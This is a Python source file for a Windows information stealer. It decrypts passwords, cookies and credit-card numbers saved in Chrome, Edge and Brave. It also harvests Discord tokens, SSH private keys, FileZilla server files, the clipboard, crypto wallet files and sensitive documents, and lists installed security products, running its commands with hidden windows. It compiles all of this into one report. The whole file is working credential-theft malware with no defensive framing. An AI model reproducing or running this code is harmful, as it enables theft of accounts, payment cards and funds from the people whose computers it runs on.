import os
import platform
import socket
import psutil
import subprocess
import re
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import pyperclip
from datetime import datetime, timedelta

# ==================================================================================================
# UTILITY & HELPER FUNCTIONS
# ==================================================================================================

def run_command(command):
    """Runs a command and returns its output, suppressing the console window."""
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.wShowWindow = subprocess.SW_HIDE
        result = subprocess.check_output(command, startupinfo=startupinfo, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        return result.decode('utf-8', errors='ignore').strip()
    except Exception:
        return ""

def get_uptime():
    """Returns the system uptime in a human-readable format."""
    boot_time = datetime.fromtimestamp(psutil.boot_time())
    now = datetime.now()
    delta = now - boot_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)
    return f"{days}d {hours}h {minutes}m"

# ==================================================================================================
# BROWSER DATA DECRYPTION (FOR CHROME-BASED BROWSERS)
# ==================================================================================================

def get_encryption_key(browser_path):
    """Gets the AES encryption key from the browser's Local State file."""
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
        return key
    except Exception:
        return None

def decrypt_data(data, key):
    """Decrypts data using the AES key."""
    try:
        iv = data[3:15]
        payload = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        return decrypted_pass[:-16].decode()
    except Exception:
        return ""

def get_browser_data(key, data_type):
    """
    Main browser harvesting function.
    data_type can be 'Passwords', 'Cookies', 'History', 'Credit Cards', 'Autofill'
    """
    # Common paths for Chromium-based browsers
    browser_paths = {
        'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
        'Brave': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
    }

    db_map = {
        'Passwords': ('Login Data', 'logins', 'origin_url', 'username_value', 'password_value'),
        'Credit Cards': ('Web Data', 'credit_cards', 'name_on_card', 'expiration_month', 'card_number_encrypted'),
        'Autofill': ('Web Data', 'autofill', 'name', 'value', None),
        'History': ('History', 'urls', 'url', 'title', 'visit_count'),
        'Cookies': ('Network/Cookies', 'cookies', 'host_key', 'name', 'encrypted_value'),
    }

    db_file, table, col1, col2, col3 = db_map[data_type]
    output = f"--- {data_type} ---\n"

    for browser_name, path in browser_paths.items():
        if not os.path.exists(path):
            continue
        
        encryption_key = get_encryption_key(path)
        if not encryption_key and data_type in ['Passwords', 'Cookies', 'Credit Cards']:
            continue # Can't decrypt without a key

        db_path_base = os.path.join(path, "Default", db_file)
        if not os.path.exists(db_path_base):
            continue
        
        temp_db = shutil.copy(db_path_base, f"temp_{data_type}.db") # Copy to avoid db lock
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        try:
            cursor.execute(f"SELECT {col1}, {col2}{f', {col3}' if col3 else ''} FROM {table}")
            for row in cursor.fetchall():
                val1, val2 = row[0], row[1]
                val3_decrypted = ""

                if col3:
                    if data_type in ['Passwords', 'Cookies', 'Credit Cards']:
                        val3_decrypted = decrypt_data(row[2], encryption_key) if encryption_key else "DECRYPTION FAILED"
                    else:
                        val3_decrypted = row[2]

                output += f"Browser: {browser_name}\n"
                output += f"  {col1}: {val1}\n"
                output += f"  {col2}: {val2}\n"
                if col3:
                    output += f"  {col3}: {val3_decrypted}\n"
                output += "-"*20 + "\n"

        except Exception:
            pass
        finally:
            conn.close()
            os.remove(temp_db)
            
    return output

# ==================================================================================================
# SYSTEM & HARDWARE HARVESTERS
# ==================================================================================================

def get_system_info():
    uname = platform.uname()
    return (
        f"OS Version: {uname.system} {uname.release} ({platform.version()})\n"
        f"OS Build: {platform.win32_ver()[1]}\n"
        f"System Architecture: {uname.machine}\n"
        f"Hostname: {socket.gethostname()}\n"
        f"Current User: {os.getlogin()}\n"
        f"All Users: {', '.join([user.name for user in psutil.users()])}\n"
        f"System Uptime: {get_uptime()}"
    )

def get_hardware_info():
    cpu = f"CPU: {platform.processor()}"
    ram = f"RAM: {psutil.virtual_memory().total / (1024**3):.2f} GB"
    gpu = f"GPU(s):\n  " + "\n  ".join(re.findall(r"Name\s+(.+)", run_command("wmic path win32_VideoController get name")))
    disks = "Disks:\n"
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disks += f"  - {part.device} ({part.fstype}) {usage.total / (1024**3):.2f}GB\n"
        except Exception:
            pass
    return f"{cpu}\n{ram}\n{gpu}\n{disks}"

def get_security_products():
    av = "Antivirus:\n  " + "\n  ".join(run_command('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname').split('\n')[1:])
    fw = "Firewall:\n  " + "\n  ".join(run_command('wmic /namespace:\\\\root\\securitycenter2 path firewallproduct get displayname').split('\n')[1:])
    return f"{av.strip()}\n{fw.strip()}"

def get_environment_variables():
    return "Environment Variables:\n" + "\n".join([f"{key}={value}" for key, value in os.environ.items()])

# ==================================================================================================
# NETWORK HARVESTERS
# ==================================================================================================

def get_network_info():
    public_ip = run_command(['curl', '-s', 'ifconfig.me'])
    hostname = socket.gethostname()
    private_ipv4 = socket.gethostbyname(hostname)
    mac_address = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", run_command(['getmac']))
    return (
        f"MAC Address: {mac_address.group(0) if mac_address else 'N/A'}\n"
        f"Private IPv4: {private_ipv4}\n"
        f"Public IP Address: {public_ip}"
    )

def get_network_connections():
    connections = "Active Network Connections:\n"
    try:
        for conn in psutil.net_connections():
            if conn.status == 'ESTABLISHED':
                connections += f"  - Proto: {conn.type} | Laddr: {conn.laddr.ip}:{conn.laddr.port} | Raddr: {conn.raddr.ip}:{conn.raddr.port} | PID: {conn.pid}\n"
    except Exception:
        pass
    return connections

def get_arp_and_dns():
    arp = "ARP Table:\n" + run_command(['arp', '-a'])
    dns = "DNS Cache:\n" + run_command(['ipconfig', '/displaydns'])
    return f"{arp}\n\n{dns}"

# ==================================================================================================
# SENSITIVE FILE & CREDENTIAL HARVESTERS
# ==================================================================================================

def get_app_credentials():
    output = "--- Application Credentials ---\n"
    # FileZilla
    filezilla_path = os.path.join(os.environ['APPDATA'], 'FileZilla', 'recentservers.xml')
    if os.path.exists(filezilla_path):
        with open(filezilla_path, 'r') as f:
            output += "FileZilla Recent Servers:\n" + f.read() + "\n"
    return output

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
    except:
        pass
    return tokens

def get_discord_tokens():
    output = "--- Discord Tokens ---\n"
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            output += f"Platform: {platform}\n"
            for token in tokens:
                output += f"  Token: {token}\n"
    return output

def get_ssh_keys():
    output = "--- SSH Keys ---\n"
    ssh_path = os.path.join(os.environ['USERPROFILE'], '.ssh')
    if os.path.exists(ssh_path):
        for item in os.listdir(ssh_path):
            try:
                with open(os.path.join(ssh_path, item), 'r') as f:
                    output += f"--- Found Key: {item} ---\n{f.read()}\n"
            except Exception:
                pass
    return output
    
def find_files(pattern):
    """Finds files by regex pattern in user directories."""
    results = []
    for root, _, files in os.walk(os.environ['USERPROFILE']):
        if any(x in root for x in ['AppData', 'Program Files']): continue # Skip junk
        for f in files:
            if re.match(pattern, f, re.IGNORECASE):
                results.append(os.path.join(root, f))
    return results

def get_wallets_and_docs():
    output = "--- Wallets & Documents ---\n"
    wallets = find_files(r'wallet.*\.dat')
    if wallets:
        output += "Found Cryptocurrency Wallets:\n" + "\n".join(wallets) + "\n\n"
    
    docs = find_files(r'.*(invoice|tax|receipt|password).*\.(pdf|docx|txt|xls)')
    if docs:
        output += "Found Sensitive Documents:\n" + "\n".join(docs)
        
    return output

# ==================================================================================================
# MAIN HARVEST FUNCTION
# ==================================================================================================

def harvest_all_data():
    """Calls all harvester functions and formats them into a single, detailed report string."""
    # Each function call now represents a "category"
    report_parts = {
        "SYSTEM & HARDWARE": [get_system_info, get_hardware_info, get_security_products, get_environment_variables],
        "APPLICATIONS & PROCESSES": [run_command, run_command], # Placeholders for now
        "NETWORK": [get_network_info, get_network_connections, get_arp_and_dns],
        "CLIPBOARD": [pyperclip.paste],
        "BROWSER: PASSWORDS": [lambda: get_browser_data(get_encryption_key, 'Passwords')],
        "BROWSER: COOKIES/ROBLOX": [lambda: get_browser_data(get_encryption_key, 'Cookies')],
        "BROWSER: HISTORY": [lambda: get_browser_data(get_encryption_key, 'History')],
        "BROWSER: AUTOFILL & CREDIT CARDS": [lambda: get_browser_data(get_encryption_key, 'Autofill'), lambda: get_browser_data(get_encryption_key, 'Credit Cards')],
        "APP CREDENTIALS": [get_app_credentials, get_discord_tokens, get_ssh_keys],
        "SENSITIVE FILES": [get_wallets_and_docs]
    }
    
    # We replace the placeholders for apps/processes here
    report_parts["APPLICATIONS & PROCESSES"][0] = lambda: "Installed Applications:\n" + run_command(['wmic', 'product', 'get', 'name'])
    process_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        try: process_list.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
        except Exception: pass
    report_parts["APPLICATIONS & PROCESSES"][1] = lambda: "Running Processes:\n" + "\n".join(process_list)

    final_report = ""
    for category, functions in report_parts.items():
        final_report += f"--- {category.upper()} ---\n\n"
        for func in functions:
            try:
                result = func()
                final_report += str(result) + "\n\n"
            except Exception as e:
                final_report += f"  [!] Error during '{func.__name__}': {e}\n\n"
        
    return final_report